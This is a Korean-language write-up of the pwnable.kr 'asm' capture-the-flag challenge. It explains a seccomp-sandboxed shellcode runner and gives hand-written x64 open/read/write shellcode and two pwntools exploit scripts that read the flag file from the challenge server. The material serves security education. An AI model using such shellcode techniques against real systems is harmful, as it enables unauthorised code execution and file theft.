# 문제
Mommy! I think I know how to make shellcodes

ssh asm@pwnable.kr -p2222 (pw: guest)

---

# 개요 

```
asm@pwnable:~$ ls -al
total 48
drwxr-x---   5 root asm   4096 Jan  2  2017 .
drwxr-xr-x 116 root root  4096 Nov 11  2021 ..
-rwxr-xr-x   1 root root 13704 Nov 29  2016 asm
-rw-r--r--   1 root root  1793 Nov 29  2016 asm.c
d---------   2 root root  4096 Nov 19  2016 .bash_history
dr-xr-xr-x   2 root root  4096 Nov 25  2016 .irssi
drwxr-xr-x   2 root root  4096 Jan  2  2017 .pwntools-cache
-rw-r--r--   1 root root   211 Nov 19  2016 readme
-rw-r--r--   1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
asm@pwnable:~$
```
플래그 파일의 상태가 매우 이상합니다. readme 파일을 먼저 확인해봅니다.

```
asm@pwnable:~$ cat readme
once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
```
9026 포트에 붙여 쉘코드를 보내야 flag를 보여준다고 합니다. 그리고 해당 내용을 보아 하니 flag 파일은 this_is~~~~~파일인것 같습니다. 이제 asm.c를 살펴봅시다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");
        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}
```
전역 배열 변수 ```stub[]``` 에 기반이 되는 어셈블리 코드가 들어가 있고 할당된 ```sh``` heap에 ```stub```을 ```memcpy``` 시키는 것을 알 수 있습니다. 그리고 해당 코드 이후에 사용자 입력을 1000바이트 받아온 뒤 ```sandbox()``` 함수를 실행합니다.
```c
void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}
```
```sandbox()``` 함수를 확인해보니 ```seccomp```를 사용하여 System Call을 제한하는 것을 확인할 수 있습니다. ```seccomp```에 대한 자세한 설명은 [여기](https://ko.wikipedia.org/wiki/Seccomp) 를 참고하세요.  
  
즉 우리는 ```open```, ```read```, ```write```, ```exit```, ```exit_group``` 5 개의 System Call을 사용하여 쉘코드를 제작해야 합니다.

---
# 분석

환경에 맞는 쉘코드를 작성하는 것이 문제 풀이의 핵심이며, ```pwntools```의 ```shellcraft```를 사용하는 방법과, 직접 쉘코드를 만들어 사용하는 방법 두 가지가 있습니다. 직접 쉘코드를 만들 경우 [x64 system call table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) 을 참조하여 [이 사이트](https://defuse.ca/online-x86-assembler.htm#disassembly2) 쉘코드를 제작합니다. 쉘코드 제작에 사용한 어셈블리 코드는 아래와 같습니다.
```asm
mov rax, 0x2
mov rdi, 0x4141406f
syscall
mov rdi, rax
mov rax, 0x0
mov rsi, 0x41414500
mov rdx, 0x100
syscall
mov rax, 0x1
mov rdi, 0x1
mov rdx, 0x00
syscall
```
```
Result (Raw Hex) : 48C7C00200000048C7C76F4041410F054889C748C7C00000000048C7C60045414148C7C2000100000F0548C7C00100000048C7C70100000048C7C2000000000F05
```
```
Result (String Literal) :
"\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\x6F\x40\x41\x41\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC6\x00\x45\x41\x41\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05"
```

만들어진 쉘코드를 사용하여 Exploit을 시도합니다.
```python
from pwn import*

s = remote("pwnable.kr", 9026)

payload = "\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\x6F\x40\x41\x41\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC6\x00\x45\x41\x41\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"

s.sendline(payload)
s.interactive()
```

두 번째 방법으로 ```shellcraft```를 활용하는 방법이 있습니다. ```shellcraft```의 사용법은 [여기](http://docs.pwntools.com/en/stable/shellcraft/amd64.html) 를 참고하시면 많은 정보를 얻으실 수 있습니다. 해당 문서를 참고하여 Exploit Code를 작성합니다.

```python
from pwn import*

file_name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

shellcode = ''
shellcode += shellcraft.pushstr(file_name)
shellcode += shellcraft.open('rsp',0, None)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
shellcode += shellcraft.exit()
shellcode = asm(shellcode)

sh = ssh(user = 'asm', host = 'pwnable.kr', port = 2222, password = 'guest')
p = sh.remote('localhost', 9026)
p.recvuntil('shellcode: ')
p.sendline(shellcode)

print(p.recv(1024).decode())

```